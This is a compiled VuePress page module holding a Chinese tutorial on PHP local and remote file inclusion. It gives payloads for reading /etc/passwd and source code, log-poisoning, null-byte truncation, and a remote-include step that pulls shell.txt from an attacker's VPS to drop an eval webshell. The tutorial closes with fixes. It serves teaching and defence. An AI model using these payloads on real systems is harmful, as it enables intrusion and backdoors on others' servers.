import{_ as s}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as a,c as n,e}from"./app.1994d791.js";const p={},t=e(`<h2 id="本地文件包含-lfi" tabindex="-1"><a class="header-anchor" href="#本地文件包含-lfi" aria-hidden="true">#</a> 本地文件包含(LFI)</h2><div class="custom-container tip"><p class="custom-container-title">漏洞成因</p><p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控</p><p>传入的文件名校验不严，能操作预想之外的文件，可能导致意外的文件泄露甚至恶意的代码注入</p><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p></div><div class="custom-container tip"><p class="custom-container-title">利用条件</p><p>（1）<code>include()</code>等函数通过动态变量的方式引入包含文件</p><p>（2）用户能够控制该动态变量</p></div><h4 id="一、读取敏感文件" tabindex="-1"><a class="header-anchor" href="#一、读取敏感文件" aria-hidden="true">#</a> 一、读取敏感文件</h4><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>?arg=/etc/passwd
?arg=C:\\Windows\\System32\\drivers\\etc\\hosts
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="二、利用封装协议读源码" tabindex="-1"><a class="header-anchor" href="#二、利用封装协议读源码" aria-hidden="true">#</a> 二、利用封装协议读源码</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>?arg<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>config.php
<span class="token comment">#这样能看到 php文件的源码</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="三、包含图片webshell" tabindex="-1"><a class="header-anchor" href="#三、包含图片webshell" aria-hidden="true">#</a> 三、包含图片Webshell</h4><p>在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p><h4 id="四、包含apache日志getshell" tabindex="-1"><a class="header-anchor" href="#四、包含apache日志getshell" aria-hidden="true">#</a> 四、包含apache日志Getshell</h4><details class="custom-container details"><summary>利用条件</summary><p>知道日志文件access.log的存放位置。</p><p>默认位置：<code>/var/log/httpd/access.log</code></p></details><details class="custom-container details"><summary>相关原理</summary><p>access.log文件记录了客户端每次请求的相关信息；</p><p>当我们访问一个不存在的资源时access.log文件仍然会记录这条资源信息。</p></details><p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，</p><p>我们就可以尝试访问</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。</p><p>理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p><p>攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。</p><p>这时再查看Apache日志文件，显示的就是正常的测试代码。</p><p>这时访问：即可成功执行代码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://www.vuln.com/index.php?arg=/var/log/httpd/access.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="五、截断包含" tabindex="-1"><a class="header-anchor" href="#五、截断包含" aria-hidden="true">#</a> 五、截断包含</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;arg&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;arg&#39;</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token keyword">include</span><span class="token punctuation">(</span>index<span class="token operator">.</span>php<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样做一定程度上修复了漏洞， 上传<strong>图片一句话</strong>并访问：<code>http://vuln.com/index.php?arg=1.jpg</code>会出错。因为包含文件里面不存在1.jpg.php这个文件。</p><p>但是如果输入<code>http://vuln.com/index.php?arg=1.jpg%00</code>，就极有可能会绕过检测。</p><p>这种方法只适用于php.ini中magic_quotes_qpc=off并且PHP版本&lt; 5.3.4的情况。</p><p>如果为on，%00会被转义，以至于无法截断。</p><h2 id="远程文件包含" tabindex="-1"><a class="header-anchor" href="#远程文件包含" aria-hidden="true">#</a> 远程文件包含</h2><div class="custom-container tip"><p class="custom-container-title">漏洞成因</p><p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p><p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的</p></div><div class="custom-container tip"><p class="custom-container-title">利用条件</p><p>在 <code>php.ini</code> 中开启以下选项</p><div class="language-ini line-numbers-mode" data-ext="ini"><pre class="language-ini"><code>allow_url_include on;
allow_url_fopen on;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></div><h4 id="远程包含webshell" tabindex="-1"><a class="header-anchor" href="#远程包含webshell" aria-hidden="true">#</a> 远程包含Webshell</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>?arg<span class="token operator">=</span>http://攻击者的VPS-IP/shell.txt
<span class="token comment">#会在网站目录生成名为 shell.php 的一句话木马</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>shell.txt内容为</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;./shell.php&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&lt;?php @eval($_POST[1]) ?&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）禁止远程文件包含 <span class="token assign-left variable">allow_url_include</span><span class="token operator">=</span>off

<span class="token number">2</span>）配置 <span class="token assign-left variable">open_basedir</span><span class="token operator">=</span>指定目录，限制访问区域

<span class="token number">3</span>）过滤<span class="token punctuation">..</span>/等特殊符号

<span class="token number">4</span>）尽量不要使用动态变量调用文件，直接写要包含的文件
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,36),i=[t];function l(c,d){return a(),n("div",null,i)}const u=s(p,[["render",l],["__file","文件包含漏洞.html.vue"]]);export{u as default};
